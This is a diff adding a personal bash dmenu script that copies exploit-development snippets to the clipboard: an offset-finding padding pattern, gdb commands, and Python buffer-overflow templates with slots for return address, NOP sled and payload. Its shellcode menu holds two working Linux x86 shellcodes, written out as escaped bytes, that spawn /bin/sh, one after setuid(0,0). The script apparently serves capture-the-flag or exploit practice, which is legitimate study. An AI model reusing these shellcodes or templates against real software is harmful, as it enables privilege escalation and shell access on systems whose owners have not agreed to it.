@@ -1,0 +1,68 @@
+#!/bin/bash
+
+choices_main="<-\n1: padding\n2: shellcode\n3: gdb\n4: headline\n5: python scripts\n6: useful"
+
+chosen_main=$(echo -e "$choices_main" | dmenu -i -l 10 -p "dev-useful:")
+
+case $chosen_main in
+	"<-")
+	       	exit 0
+	;;
+	"1: padding")
+	       	printf "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz11112222333344445555666677778888999900001AAA1BBB1CCC1DDD1EEE1FFF1GGG1HHH1III1JJJ1KKK1LLL1MMM1NNN1OOO1PPP1QQQ1RRR1SSS1TTT1UUU1VVV1WWW1XXX1YYY1ZZZ1aaa1bbb1ccc1ddd1eee1fff1ggg1hhh1iii1jjj1kkk1lll1mmm1nnn1ooo1ppp1qqq1rrr1sss1ttt1uuu1vvv1www1xxx1yyy1zzz0111122213331444155516661777188819991000" | xclip -selection clipboard 
+		notify-send "Copied to clipboard."
+	;;
+
+	"2: shellcode")
+		choices_shellcode="<-\n1: Linux_x86 - setuid(0,0) & execve(/bin/sh)\n2: Linux_x86 - execve(/bin/sh)"
+		chosen_shellcode=$(echo -e "$choices_shellcode" | dmenu -l 5 -p "Shellcodes:")
+		
+		case $chosen_shellcode in
+			"<-") /home/moritz/.scripts/dmenu-kram/exploit-texte ;;
+			"1: Linux_x86 - setuid(0,0) & execve(/bin/sh)")
+			       	echo "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" | xclip -selection clipboard
+				notify-send "Copied to clipboard.";;
+			"2: Linux_x86 - execve(/bin/sh)") 
+				echo "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" | xclip -selection clipboard
+				notify-send "Copied to clipboard.";;
+		esac
+	;;
+	"3: gdb") 
+		echo -e "set disassembly-flavor intel\ninfo functions" | xclip -selection clipboard	
+	;;
+	"4: headline") 
+		choices_headline="<-\n1: #!/bin/bash\n2: #!/usr/bin/python\n"
+		chosen_headline=$(echo -e "$choices_headline" | dmenu -l 5 -p "headline:")
+
+		case $chosen_headline in
+			"<-") /home/moritz/.scripts/dmenu-kram/exploit-texte;;
+			"1: #!/bin/bash") 
+				echo "#!/bin/bash" | xclip -selection clipboard
+				notify-send "Copied to clipboard."
+				;;
+			"2: #!/usr/bin/python")
+				echo "#!/usr/bin/python" | xclip -selection clipboard
+				notify-send "Copied to clipboard."
+				;;
+		esac
+	;;
+	"5: python scripts")
+		choices_script="<-\n1: Simple Buffer Overflow\n2: Buffer Overflow; 1 modified value\n"
+                chosen_script=$(echo -e "$choices_script" | dmenu -l 5 -p "Script:")
+		
+		case $chosen_script in
+			"<-") /home/moritz/.scripts/dmenu-kram/exploit-texte;;
+			"1: Simple Buffer Overflow")
+				printf "#!/usr/bin/python\nimport struct\n\npadding=\nret=struct.pack(\"I\", )\nnopsled=\npayload=\n\nprint(padding+ret+nopsled+payload)" | xclip -selection clipboard
+				notify-send "Copied to clipboard.";;
+			"2: Buffer Overflow; 1 modified value") 
+				printf "#!/usr/bin/python\nimport struct\n\npadding1 = \"\"\nmodified1 = struct.pack(\"I\", )\npadding2 = \"\"\nret = struct.pack(\"I\", )\nnopsled = \"\"\npayload = \"\"\n\nprint(padding1+modified1+padding2+ret+nopsled+payload)" | xclip -selection clipboard
+				notify-send "Copied to clipboard.";;
+		esac
+	;;
+	"6: useful")
+		chosen_script=$(ls /home/moritz/.scripts/dmenu-kram/useful/ | dmenu -l 10 -p "Script:")
+		cat "/home/moritz/.scripts/dmenu-kram/useful/$chosen_script" | xclip -selection clipboard
+		notify-send "Copied $chosen_script to clipboard"
+	;;
+esac
